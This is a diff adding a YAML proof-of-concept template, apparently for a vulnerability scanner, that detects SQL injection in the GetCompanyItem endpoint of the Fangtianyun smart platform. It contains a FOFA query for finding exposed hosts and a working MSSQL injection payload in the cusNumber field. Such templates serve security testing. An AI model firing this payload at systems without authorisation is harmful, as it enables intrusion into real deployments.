@@ -1,0 +1,20 @@
+id: poc-yaml-ftyerp-getcompanyitem-sqli
+info:
+  name: 方天云智慧平台系统 GetCompanyItem SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: ftyerp
+  fofa: body="AjaxMethods.asmx/GetCompanyItem"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /AjaxMethods.asmx/GetCompanyItem
+  headers:
+    Content-Type: application/json
+  data: '{cusNumber:"1'' and 2=sys.fn_varbintohexstr(hashbytes(''MD5'',''{{.t1}}''))--+"}'
+  expression: "status_code == 500 && \ncontains(body,t2) &&\ncontains(body,\"在将 nvarchar\
+    \ 值\") &&\ncontains(body,\"转换成数据类型 int 时失败\")\n"
+transport: http
